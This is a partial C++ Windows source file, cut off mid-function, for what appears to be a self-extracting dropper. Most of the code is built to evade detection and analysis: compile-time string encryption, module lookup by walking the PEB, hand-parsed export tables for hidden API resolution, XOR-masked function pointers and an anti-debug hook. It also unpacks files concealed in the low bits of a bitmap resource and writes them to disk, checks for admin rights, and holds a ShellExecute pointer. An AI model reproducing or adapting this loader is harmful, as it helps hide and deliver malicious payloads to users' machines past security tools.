#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <windows.h>
#include <winternl.h>
#include <array>
#include <limits>

#include "swap.h"
#include "defs.h"
static char *valuebytes=NULL;
static HANDLE iMutex;

#define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
#define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
template <char c> struct enc_a{ enum{ v=(char)low_byte( swapbytes[(uint8_t)c]) }; };
template <char c> struct enc_b{ enum{ v=(char)high_byte(swapbytes[(uint8_t)c]) }; };
#define eca(c)  enc_a<c>::v
#define ecb(c)  enc_b<c>::v
#define e1(s)  eca(s[0])        ,ecb( s[0])
#define e2(s)  e1(s) ,eca( s[1]),ecb( s[1])
#define e3(s)  e2(s) ,eca( s[2]),ecb( s[2])
#define e4(s)  e3(s) ,eca( s[3]),ecb( s[3])
#define e5(s)  e4(s) ,eca( s[4]),ecb( s[4])
#define e6(s)  e5(s) ,eca( s[5]),ecb( s[5])
#define e7(s)  e6(s) ,eca( s[6]),ecb( s[6])
#define e8(s)  e7(s) ,eca( s[7]),ecb( s[7])
#define e9(s)  e8(s) ,eca( s[8]),ecb( s[8])
#define e10(s) e9(s) ,eca( s[9]),ecb( s[9])
#define e11(s) e10(s),eca(s[10]),ecb(s[10])
#define e12(s) e11(s),eca(s[11]),ecb(s[11])
#define e13(s) e12(s),eca(s[12]),ecb(s[12])
#define e14(s) e13(s),eca(s[13]),ecb(s[13])
#define e15(s) e14(s),eca(s[14]),ecb(s[14])
#define e16(s) e15(s),eca(s[15]),ecb(s[15])
#define e17(s) e16(s),eca(s[16]),ecb(s[16])
#define e18(s) e17(s),eca(s[17]),ecb(s[17])
#define e19(s) e18(s),eca(s[18]),ecb(s[18])
#define e20(s) e19(s),eca(s[19]),ecb(s[19])
#define e21(s) e20(s),eca(s[20]),ecb(s[20])
#define e22(s) e21(s),eca(s[21]),ecb(s[21])
#define e23(s) e22(s),eca(s[22]),ecb(s[22])
#define e24(s) e23(s),eca(s[23]),ecb(s[23])
#define e25(s) e24(s),eca(s[24]),ecb(s[24])
#define e26(s) e25(s),eca(s[25]),ecb(s[25])
#define e27(s) e26(s),eca(s[26]),ecb(s[26])
#define e28(s) e27(s),eca(s[27]),ecb(s[27])
#define e29(s) e28(s),eca(s[28]),ecb(s[28])
#define e30(s) e29(s),eca(s[29]),ecb(s[29])
#define e31(s) e30(s),eca(s[30]),ecb(s[30])
#define e32(s) e31(s),eca(s[31]),ecb(s[31])
#define e33(s) e32(s),eca(s[32]),ecb(s[32])
#define e34(s) e33(s),eca(s[33]),ecb(s[33])
#define e35(s) e34(s),eca(s[34]),ecb(s[34])
#define e36(s) e35(s),eca(s[35]),ecb(s[35])
#define e37(s) e36(s),eca(s[36]),ecb(s[36])
#define e38(s) e37(s),eca(s[37]),ecb(s[37])
#define e39(s) e38(s),eca(s[38]),ecb(s[38])
#define e40(s) e39(s),eca(s[39]),ecb(s[39])
#define e41(s) e40(s),eca(s[40]),ecb(s[40])
#define e42(s) e41(s),eca(s[41]),ecb(s[41])
#define e43(s) e42(s),eca(s[42]),ecb(s[42])
#define e44(s) e43(s),eca(s[43]),ecb(s[43])
#define e45(s) e44(s),eca(s[44]),ecb(s[44])
#define e46(s) e45(s),eca(s[45]),ecb(s[45])
#define e47(s) e46(s),eca(s[46]),ecb(s[46])
#define e48(s) e47(s),eca(s[47]),ecb(s[47])
#define e49(s) e48(s),eca(s[48]),ecb(s[48])
#define e50(s) e49(s),eca(s[49]),ecb(s[49])
#define e51(s) e50(s),eca(s[50]),ecb(s[50])
#define e52(s) e51(s),eca(s[51]),ecb(s[51])
#define e53(s) e52(s),eca(s[52]),ecb(s[52])
#define e54(s) e53(s),eca(s[53]),ecb(s[53])
#define e55(s) e54(s),eca(s[54]),ecb(s[54])
#define _(s,i) {e##i(s),eca(0)  ,ecb(0), 0}
#define merge_bytes(lb,hb) ((lb-97)|((hb-97)<<4))

#define __fdecl __attribute__ ((cdecl)) __attribute__ ((nothrow)) __attribute__ ((noinline)) __attribute__ ((noclone)) \
__attribute__ ((cold)) __attribute__ ((aligned(16))) static

__fdecl void __(const char *s,unsigned short l){
  uint8_t j=0;
  for(uint8_t i=0;i<l+1;i++){
    ((char *)s)[i]=valuebytes[merge_bytes(((char *)s)[j],((char *)s)[j+1])];
    j+=2;
  };
}
#define _s(n,s,l) const char n[]=_(s,l);__(n,l);

namespace obfs {
  constexpr int RandomSeed(void){
    return '0'    * -40271 + // offset accounting for digits ANSI offsets
      __TIME__[7] *      1 +
      __TIME__[6] *     10 +
      __TIME__[4] *     60 +
      __TIME__[3] *    600 +
      __TIME__[1] *   3600 +
      __TIME__[0] *  36000;
  };
  template <unsigned int a,
            unsigned int c,
            unsigned int seed,
            unsigned int Limit>
  struct LinearCongruentialEngine{
    enum { value=(a*LinearCongruentialEngine<a,c-1,seed,Limit>::value+1)%Limit };
  };
  template <unsigned int a,
            unsigned int seed,
            unsigned int Limit>
  struct LinearCongruentialEngine<a,0,seed,Limit>{
    enum {value=(a*seed+1)%Limit };
  };
  template <int N,int Limit>
  struct MetaRandom {
    enum { value=LinearCongruentialEngine<22695477,N,RandomSeed(),Limit>::value };
  };

  template <typename Indexes, int n,int id> class MetaString;
  template <size_t... I, int n,int id> class MetaString<std::index_sequence<I...>,n,id> {
    public:
      constexpr MetaString(char const *str)
      : encrypted_buffer{ encrypt(str[I])... } {};
    public:
      char* decrypt(void){
        for (size_t i=0;i<sizeof...(I);i++){
          buffer[i]=decrypt(encrypted_buffer[i]);
        };
        buffer[sizeof...(I)]=0;
        return buffer;
      }
    private:
      constexpr char encrypt(char c) const { return (c+0xa)^ffs[n]()^ffs[(uint8_t)F_0](); } ;
      char decrypt(char c) const { return (c^ffs[n]()^ffs[(uint8_t)F_0]())-0xa; } ;
    private:
      char buffer[sizeof...(I) + 1] {};
      char encrypted_buffer[sizeof...(I)] {};
  };
};

#define o(str) (obfs::MetaString<std::make_index_sequence<sizeof(str)>,obfs::MetaRandom<__COUNTER__,256>::value,__COUNTER__>(str).decrypt())

static PPEB ppeb=NULL;
__fdecl void dbg();
static HINSTANCE huser32,hshell32,hgdi32,hadvapi32,hkernel32,hntdll;

#define TIME_TYPE LARGE_INTEGER
#define GET_TIME(s) (QueryPerformanceCounter(&(s)))
#define GET_TIME_LAST_2BYTES(s) ((uint32_t)((s).QuadPart&0xffff))
#define GET_TIME_LAST_BIT(s) ((uint32_t)((s).QuadPart&1))
static volatile uint32_t seed=0;
#define _f(f) (void *)(((uint64_t)f^(uint64_t)(ffs[0]?seed:(ffs[1]?seed:0))^(uint64_t)F_0^((uint64_t)ffs[(seed)&0xff]())^\
(((uint64_t)ffs[(seed>>8)&0xff]())<<8)^((uint64_t)ffs[(seed>>16)&0xff]())<<16)^(((uint64_t)ffs[(seed>>24)&0xff]())<<24))

__fdecl double pi(uint32_t t){
  double p=0.0;
  double s=1.0;
  for(uint32_t i=0; i<t; i++){
    double k=8.0*i;
    p+=(4.0/(k+1)-2.0/(k+4)-1.0/(k+5)-1.0/(k+6))/s;
    s*=16.0;
  };
  return p;
}

__fdecl uint32_t timeshift(){
  uint32_t offsets[]={1009,3109,9109,12109,24107,48109,96053};
  uint32_t i=0;
  TIME_TYPE sw;
  GET_TIME(sw);
  i=GET_TIME_LAST_2BYTES(sw);
  do{
    GET_TIME(sw);
    pi(offsets[(uint32_t)(GET_TIME_LAST_2BYTES(sw))%7]);
  }while(i--);
  GET_TIME(sw);
  return GET_TIME_LAST_BIT(sw);
}

__fdecl uint32_t timebits(){
  uint32_t l=0;
  for(uint8_t i=0; i<32; i++){
    l<<=1;
    l|=timeshift();
  };
  return l;
}

typedef volatile HMODULE (WINAPI *LLA)(LPCSTR); static LLA lla;
typedef volatile BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*); static SEA sea;
typedef volatile HBITMAP (WINAPI *CBMP)(int,int,UINT,UINT,const VOID*); static CBMP cbmp;
typedef volatile HDC (WINAPI *CCDC)(HDC); static CCDC cdc;
typedef volatile BOOL (WINAPI *DDC)(HDC); static DDC ddc;
typedef volatile BOOL (WINAPI *DOB)(HGDIOBJ); static DOB dob;
typedef volatile int (WINAPI *GOA)(HANDLE,int,LPVOID); static GOA goa;
typedef volatile BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD); static BLT blt;
typedef volatile HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ); static SOB sob;
typedef volatile HPEN (WINAPI *CRP)(int,int,COLORREF); static CRP crp;
typedef volatile BOOL (WINAPI *LTO)(HDC,int,int); static LTO lto;
typedef volatile BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT); static MTE mte;
typedef volatile BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL); static AWR awr;
typedef volatile HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT); static BEP bep;
typedef volatile BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *); static EPA epa;
typedef volatile BOOL (WINAPI *GCR)(HWND,LPRECT); static GCR gcr;
typedef volatile HDC (WINAPI *GDC)(HWND); static GDC gdc;
typedef volatile int (WINAPI *GSM)(int); static GSM gsm;
typedef volatile BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL); static IVR ivr;
typedef volatile BOOL (WINAPI *PIR)(const RECT *,POINT); static PIR pir;
typedef volatile BOOL (WINAPI *RCP)(); static RCP rcp;
typedef volatile int (WINAPI *RDC)(HWND,HDC); static RDC rdc;
typedef volatile BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT); static TMV tmv;
typedef volatile BOOL (WINAPI *UWI)(HWND); static UWI uwi;
typedef volatile BOOL (WINAPI *FLIB)(HMODULE); static FLIB flib;
typedef volatile UINT (WINAPI *RWMA)(LPCSTR); static RWMA rwma;
typedef volatile LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM); static SMA sma;
typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*); static CLTAW cltaw;
typedef volatile HCURSOR (WINAPI *LCA)(HINSTANCE,LPCSTR); static LCA lca;
typedef volatile BOOL (WINAPI *WFE)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED); static WFE wfe;
typedef volatile BOOL (WINAPI *CDA)(LPCSTR,LPSECURITY_ATTRIBUTES); static CDA cda;
typedef volatile DWORD (WINAPI *GFA)(LPCSTR); static GFA gfa;
typedef volatile HANDLE (WINAPI *CFA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE); static CFA cfa;
typedef volatile LPWSTR (WINAPI *GCW)(); static GCW gcw;
typedef volatile HRSRC (WINAPI *FRA)(HMODULE,LPCSTR,LPCSTR); static FRA fra;
typedef volatile HGLOBAL (WINAPI *LRS)(HMODULE,HRSRC); static LRS lrs;
typedef volatile LPVOID (WINAPI *LCR)(HGLOBAL); static LCR lcr;
typedef volatile DWORD (WINAPI *GEV)(LPCSTR,LPSTR,DWORD); static GEV gev;
typedef volatile void (WINAPI *SLE)(DWORD); static SLE sle;
typedef volatile NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW); static RGV rgv;
typedef volatile BOOL (WINAPI *AAS)(PSID_IDENTIFIER_AUTHORITY,BYTE,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,PSID*); static AAS aas;
typedef volatile BOOL (WINAPI *CTM)(HANDLE,PSID,PBOOL); static CTM ctm;
typedef volatile PVOID (WINAPI *FSD)(PSID); static FSD fsd;
typedef volatile DWORD (WINAPI *GMF)(HMODULE,LPSTR,DWORD); static GMF gmf;

extern "C" PVOID WINAPI RtlGetCurrentPeb();

__fdecl uint16_t strlen_i(const char *src){
  uint16_t i=0;
  uint8_t *c=(uint8_t *)src;
  while(*c++ && i++!=0xffff);
  if(i==0xffff) i=0;
  return i;
};

__fdecl void get_module_name(HMODULE m,char *l){
  ULONG_PTR moduleBase;
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS ntHeaders;
  PIMAGE_EXPORT_DIRECTORY eatDirectory;
  moduleBase=(ULONG_PTR)m;
  dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
  ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
  eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  char *n=(char*)(moduleBase+eatDirectory->Name),*s=l;
  for(uint8_t i=0;i<13;i++){
    if(*s!=((*n>64 && *n<97)?(*n+32):*n)){
      MessageBoxA(0,o("Ошибка загрузки библиотеки!"),l,MB_ICONERROR|MB_OK);
      ExitProcess(1);
    };
    if(!*n || !*s) break;
    n++;
    s++;
  };
};

__fdecl void get_handles(){
  PLDR_DATA_TABLE_ENTRY ldrDataTableEntry=NULL;
  ldrDataTableEntry=CONTAINING_RECORD(ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink,
                                      LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
  hntdll=(HMODULE)ldrDataTableEntry->DllBase;
  ldrDataTableEntry=CONTAINING_RECORD(ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink,
                                      LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
  hkernel32=(HMODULE)ldrDataTableEntry->DllBase;
};

__fdecl void *gpa(HMODULE m,const char *f){
  ULONG_PTR moduleBase;
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS ntHeaders;
  PIMAGE_EXPORT_DIRECTORY eatDirectory;
  DWORD* eatFunctions;
  WORD* eatOrdinals;
  DWORD* eatNames;
  DWORD eatNameOffset;
  moduleBase=(ULONG_PTR)m;
  dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
  ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
  eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  eatFunctions=(DWORD*)(moduleBase+eatDirectory->AddressOfFunctions);
  eatOrdinals=(WORD*)(moduleBase+eatDirectory->AddressOfNameOrdinals);
  eatNames=(DWORD*)(moduleBase+eatDirectory->AddressOfNames);
  void *f_ptr=NULL;
  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
    eatNameOffset=eatNames[i];
    char *src=(char*)(moduleBase+eatNameOffset);
    char *dst=(char*)f;
    while(*src && *dst){
      if(*src!=*dst) break;
      src++;
      dst++;
    };
    if(*src==0 && *dst==0) f_ptr=(void *)(moduleBase+eatFunctions[eatOrdinals[i]]);
  };
  return f_ptr;
};

__fdecl void *get_fn_ptr(HINSTANCE l,const char *f){
  void* p=NULL;
  if(l){
    p=gpa(l,f);
    p=_f(p);
    if(!p){
      if(iMutex) CloseHandle(iMutex);
      ExitProcess(1);
    };
    char *c=(char *)f;
    while(*c) *c++=0;
    return p;
  };
  if(iMutex) CloseHandle(iMutex);
  ExitProcess(1);
};

static HBITMAP hBitmap,hOldBitmap;
static HDC hdc,hdcMem;
static BITMAP bm;
static HINSTANCE hI;
static PAINTSTRUCT ps;
static RECT rect,rc,rc_yes,rc_no;
static HPEN hpen;
static POINT mpos;
static BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
static TRACKMOUSEEVENT tme;
static int dlg_ret=0;
static bool inv=false;
static uint8_t *image=NULL;
static uint32_t tcounter=60;
static char tnumbers[100][3];

static LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  switch(msg){
    case WM_CREATE:
      hBitmap=((CBMP)_f(cbmp))(506,191,1,32,image);
      ((GOA)_f(goa))(hBitmap,sizeof(BITMAP),&bm);
      hdc=((GDC)_f(gdc))(hWnd);
      hdcMem=((CCDC)_f(cdc))(hdc);
      hOldBitmap=(HBITMAP)((SOB)_f(sob))(hdcMem,hBitmap);
      hpen=((CRP)_f(crp))(PS_SOLID,8,RGB(39,39,39));
      ((RDC)_f(rdc))(hWnd,hdc);
      return 0;
    case WM_KEYDOWN:
      if(wParam==VK_ESCAPE||wParam=='N'||wParam=='n'){
        DestroyWindow(hWnd);
        return 0;
      }
      else{
        if(wParam=='Y'||wParam=='y'){
          dlg_ret=1;
          DestroyWindow(hWnd);
          return 0;
        };
      };
      break;
    case WM_LBUTTONDOWN:
      ((RCP)_f(rcp))();
      ((SMA)_f(sma))(hWnd,0xA1,2,0);
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      if(((PIR)_f(pir))(&rc_yes,mpos)){
        dlg_ret=1;
        DestroyWindow(hWnd);
        return 0;
      };
      if(((PIR)_f(pir))(&rc_no,mpos)){
        DestroyWindow(hWnd);
        return 0;
      };
      break;
    case WM_MOUSEMOVE:
      if(!mousetrack) mousetrack=((TMV)_f(tmv))(&tme);
      break;
    case WM_MOUSELEAVE:
      mousetrack=FALSE;
      if(mark_yes||mark_no) inv=true;
      mark_yes=FALSE;
      mark_no=FALSE;
      if(inv){
        ((IVR)_f(ivr))(hWnd,NULL,FALSE);
        ((UWI)_f(uwi))(hWnd);
        inv=false;
      };
      break;
    case WM_MOUSEHOVER:
      mousetrack=FALSE;
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      inv=false;
      if(((PIR)_f(pir))(&rc_yes,mpos)){
        if(!mark_yes){
          mark_yes=TRUE;
          inv=true;
        };
        if(mark_no){
          mark_no=FALSE;
          inv=true;
        };
      }
      else{
        if(((PIR)_f(pir))(&rc_no,mpos)){
          if(!mark_no){
            mark_no=TRUE;
            inv=true;
          };
          if(mark_yes){
            mark_yes=FALSE;
            inv=true;
          };
        }
        else{
          if(mark_yes||mark_no) inv=true;
          mark_no=FALSE;
          mark_yes=FALSE;
        };
      };
      if(inv){
        ((IVR)_f(ivr))(hWnd,NULL,FALSE);
        ((UWI)_f(uwi))(hWnd);
      };
      break;
    case WM_PAINT:
      hdc=((BEP)_f(bep))(hWnd,&ps);
      ((GCR)_f(gcr))(hWnd,&rect);
      ((BLT)_f(blt))(hdc,0,0,rect.right,rect.bottom,hdcMem,0,0,SRCCOPY);
      if(mark_yes){
        ((SOB)_f(sob))(hdc,hpen);
        ((MTE)_f(mte))(hdc,33,118,NULL);
        ((LTO)_f(lto))(hdc,53,138);
        ((LTO)_f(lto))(hdc,33,158);
        ((MTE)_f(mte))(hdc,220,118,NULL);
        ((LTO)_f(lto))(hdc,200,138);
        ((LTO)_f(lto))(hdc,220,158);
      };
      if(mark_no){
        ((SOB)_f(sob))(hdc,hpen);
        ((MTE)_f(mte))(hdc,286,118,NULL);
        ((LTO)_f(lto))(hdc,306,138);
        ((LTO)_f(lto))(hdc,286,158);
        ((MTE)_f(mte))(hdc,473,118,NULL);
        ((LTO)_f(lto))(hdc,453,138);
        ((LTO)_f(lto))(hdc,473,158);
      };
      ((EPA)_f(epa))(hWnd,&ps);
      break;
    case WM_TIMER:
      if(tcounter){
        SetWindowTextA(hWnd,tnumbers[--tcounter]);
      }
      else{
        DestroyWindow(hWnd);
        return 0;
      };
      break;
    case WM_DESTROY:
      KillTimer(hWnd,0);
      PostQuitMessage(0);
      ((DDC)_f(ddc))(hdcMem);
      ((DOB)_f(dob))(hBitmap);
      ((DOB)_f(dob))(hOldBitmap);
      break;
  }
  return DefWindowProcA(hWnd,msg,wParam,lParam);
}

__fdecl int dlg_window(HINSTANCE hInstance){
  hI=hInstance;
  WNDCLASS wc;
  wc.style=0;
  wc.lpfnWndProc=dlg_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=NULL;
  wc.hCursor=((LCA)_f(lca))(NULL,IDC_ARROW);
  wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
  _s(idc,"imgdlgclass",11);
  wc.lpszClassName=idc;
  wc.lpszMenuName=NULL;
  wc.cbClsExtra=0;
  wc.cbWndExtra=0;
  RegisterClassA(&wc);
  rc={0,0,506,191};
  rc_yes={19,104,234,175};
  rc_no={272,104,487,175};
  ((AWR)_f(awr))(&rc,WS_CAPTION|WS_SYSMENU,FALSE);
  int nWidth=rc.right-rc.left;
  int nHeight=rc.bottom-rc.top;
  int nX=(((GSM)_f(gsm))(SM_CXSCREEN)-nWidth)/2;
  int nY=(((GSM)_f(gsm))(SM_CYSCREEN)-nHeight)/2;
  if(nX<0) nX=0;
  if(nY<0) nY=0;
  tme.cbSize=sizeof(tme);
  tme.dwFlags=TME_HOVER|TME_LEAVE;
  tme.dwHoverTime=10;
  HWND hWnd=CreateWindowExA(WS_EX_COMPOSITED|WS_EX_TOOLWINDOW|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_CAPTION|WS_SYSMENU,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
  if(!hWnd){
     UnregisterClassA(wc.lpszClassName,hInstance);
     return 0;
  };
  tme.hwndTrack=hWnd;
  ShowWindow(hWnd,SW_SHOW);
  SetTimer(hWnd,0,1000,(TIMERPROC)NULL);
  SetWindowTextA(hWnd,tnumbers[tcounter]);
  ((UWI)_f(uwi))(hWnd);
  MSG msg;
  while(GetMessageA(&msg,NULL,0,0)){
    DispatchMessageA(&msg);
    TranslateMessage(&msg);
  };
  UnregisterClassA(wc.lpszClassName, hInstance);
  return 0;
}

static UINT null_msg;

static LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  switch(msg){
    case WM_CREATE:
      ((SMA)_f(sma))(hWnd,null_msg,0,0);
      return 0;
    case WM_CLOSE:
    case WM_DESTROY:
    case WM_ENDSESSION:
      PostQuitMessage(0);
      break;
    default:
      if(msg==null_msg){
        dlg_window(0);
        PostQuitMessage(0);
      };
      break;
  }
  return DefWindowProcA(hWnd,msg,wParam,lParam);
};

__fdecl void null_window(HINSTANCE hInstance){
  MSG msg;
  WNDCLASS wc;
  HWND hwnd;
  wc.style=wc.cbClsExtra=wc.cbWndExtra=0;
  wc.lpfnWndProc=null_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=wc.hCursor=NULL;
  wc.hbrBackground=NULL;
  wc.lpszMenuName=NULL;
  _s(clsn,"main",4);
  wc.lpszClassName=clsn;
  null_msg=((RWMA)_f(rwma))(wc.lpszClassName);
  if(!RegisterClassA(&wc)) return;
  hwnd=CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,0,0,hInstance,0);
  if(!hwnd){
     UnregisterClassA(wc.lpszClassName,hInstance);
     return;
  };
  while(GetMessageA(&msg,NULL,0,0)>0){
    DispatchMessageA(&msg);
  };
  UnregisterClassA(wc.lpszClassName,hInstance);
  return;
};

static uint8_t read_shift=0;
static uint8_t read_mask=0;
static uint8_t *res=NULL;

__fdecl uint8_t bytes2byte_raw(){
  uint8_t b=0;
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  return b;
};

__fdecl uint8_t bytes2byte(){
  uint8_t b=bytes2byte_raw()^read_mask;
  read_mask=b;
  return b;
};

__fdecl void bytes2uint(uint32_t &b){
  b=0;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte();
};

#define LZ_BUF_SIZE 259
#define LZ_CAPACITY 24
#define LZ_MIN_MATCH 3

static uint8_t flags;
static uint8_t *cbuffer=NULL;
static uint8_t *vocbuf=NULL;
static uint32_t *frequency=NULL;
static uint16_t buf_size;
static uint16_t vocroot;
static uint16_t offset;
static uint16_t lenght;
static uint16_t symbol;
static uint32_t low;
static uint32_t hlp;
static uint32_t range;
static uint32_t *fc;
static char *lowp;
static char *hlpp;
static uint8_t *cpos;
static uint8_t rle_flag;

static uint32_t dptr;
static uint32_t dsize;

__fdecl uint8_t dgetc(){
  dbg();
  uint8_t s=0;
  if(dptr<dsize){
    s=bytes2byte();
    dptr++;
  };
  return s;
}

__fdecl uint8_t rc32_getc(uint8_t *c){
  while((range<0x10000)||(hlp<low)){
    if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
      range=0x10000-(uint16_t)low;
    hlp<<=8;
    *hlpp=dgetc();
    if(dptr==dsize) return 0;
    low<<=8;
    range<<=8;
  };
  range/=*fc;
  uint32_t count=(hlp-low)/range;
  if(count>=*fc) return 1;
  symbol=0;
  uint16_t i,j=128;
  while(j){
    if(frequency[symbol]<=count) symbol+=j;
    else{
      if(symbol) symbol-=j;
      else break;
    };
    j>>=1;
  };
  if(frequency[symbol]>count&&symbol) symbol--;
  *c=(uint8_t)symbol;
  j=frequency[symbol++];
  low+=j*range;
  range*=frequency[symbol]-j;
  for(i=symbol;i<257;i++) frequency[i]++;
  if(*fc>0xffff){
    uint32_t *fp=frequency;
    frequency[0]>>=1;
    for(i=1;i<257;i++){
      if((frequency[i]>>=1)==*fp++) frequency[i]++;
    };
  };
  return 0;
}

__fdecl uint8_t unpack_file(){
  uint16_t i;
  if(lenght){
    if(!rle_flag){
      symbol=vocbuf[offset++];
      vocbuf[vocroot++]=symbol;
    };
    lenght--;
  }
  else{
    if(flags==0){
      cpos=cbuffer;
      if(rc32_getc(cpos++)) return 1;
      flags=8;
      lenght=0;
      symbol=*cbuffer;
      for(i=0;i<flags;i++){
        if(symbol&0x80) lenght++;
        else lenght+=3;
        symbol<<=1;
      };
      for(i=lenght;i;i--)
        if(rc32_getc(cpos++)) return 1;
      cpos=cbuffer+1;
    };
    lenght=0;
    if(*cbuffer&0x80){
      symbol=*cpos;
      vocbuf[vocroot++]=*cpos;
    }
    else{
      lenght=*cpos+++LZ_MIN_MATCH+1;
      offset=*(uint16_t*)cpos++;
      if(offset==0x0100) return 1;
      if(offset<0x0100){
        rle_flag=1;
        symbol=offset;
        for(i=0;i<lenght;i++) vocbuf[vocroot++]=symbol;
        lenght--;
      }
      else{
        rle_flag=0;
        offset=0xffff+(uint16_t)(vocroot+LZ_BUF_SIZE)-offset;
        symbol=vocbuf[offset++];
        vocbuf[vocroot++]=symbol;
        lenght--;
      };
    };
    *cbuffer<<=1;
    cpos++;
    flags--;
  };
  return 0;
}

__fdecl bool is_exists(const char *path){
  uint32_t a=(uint32_t)((GFA)_f(gfa))(path);
  return ((a!=INVALID_FILE_ATTRIBUTES) && (a&FILE_ATTRIBUTE_DIRECTORY));
};

__fdecl void rmkdir(char *path,int depth){
  for(uint16_t i=depth;i<strlen_i(path);i++){
    if(path[i]=='/'){
      path[i]=0;
      if(!is_exists(path)){
        ((CDA)_f(cda))(path,NULL);
        if(!is_exists(path)) return;
      };
      path[i]='/';
      depth=i+1;
      rmkdir(path,depth);
      break;
    };
  };
  return;
}

__fdecl uint8_t read_packed_value(void *p,uint16_t s){
  for(uint16_t i=0;i<s;i++){
    if(unpack_file()) return 1;
    ((char *)p)[i]=(char)symbol;
  };
  return 0;
}

__fdecl void init_unpack(const uint32_t data_size_in){
  dsize=data_size_in;
  dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
  offset=range=0xffffffff;
  lowp=&((char *)&low)[3];
  hlpp=&((char *)&hlp)[0];
  fc=&frequency[256];
  uint32_t i;
  for(i=0;i<257;i++) frequency[i]=i;
  for(i=0;i<0x10000;i++) vocbuf[i]=0xff;
  for(i=0;i<sizeof(uint32_t);i++){
    hlp<<=8;
    *hlpp=dgetc();
  }
};

__fdecl void unarc(char *out){
  HANDLE o;
  DWORD w;
  uint32_t fl=0,i;
  char *t=(char *)&fl,fp[257],c;
  for(;;){
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    for(i=0;i<strlen_i(out);i++) fp[i]=out[i];
    fp[i]='/';
    if(read_packed_value(&fp[strlen_i(out)+1],fl)) break;
    if(dptr==dsize) break;
    fp[fl+strlen_i(out)+1]=0;
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    rmkdir(fp,0);
    o=((CFA)_f(cfa))(fp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(o!=INVALID_HANDLE_VALUE){
      for(i=0;i<fl;i++){
        if(unpack_file()) return;
        c=(char)symbol;
        ((WFE)_f(wfe))(o,&c,1,&w,NULL);
      };
      CloseHandle(o);
    };
  };
}

__fdecl BOOL is_admin(){
  BOOL result=FALSE;
  SID_IDENTIFIER_AUTHORITY NtAuthority=SECURITY_NT_AUTHORITY;
  PSID AdministratorsGroup;
  result=((AAS)_f(aas))(&NtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&AdministratorsGroup);
  if(result){
    ((CTM)_f(ctm))(NULL,AdministratorsGroup,&result);
    ((FSD)_f(fsd))(AdministratorsGroup);
  };
  return result;
}

__fdecl bool iswin10(){
  if(rgv){
    OSVERSIONINFOEXW osInfo;
    osInfo.dwOSVersionInfoSize=sizeof(osInfo);
    rgv(&osInfo);
    return (uint32_t)osInfo.dwMajorVersion>=10?true:false;
  };
  return false;
};

#define data_res 0x10
#define image_size 386584

__fdecl uint8_t *load_res(uint32_t id){
  HRSRC fres=fra(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
  if(fres){
    HGLOBAL res_handle=lrs(NULL,fres);
    if(res_handle) return (uint8_t*)lcr(res_handle);
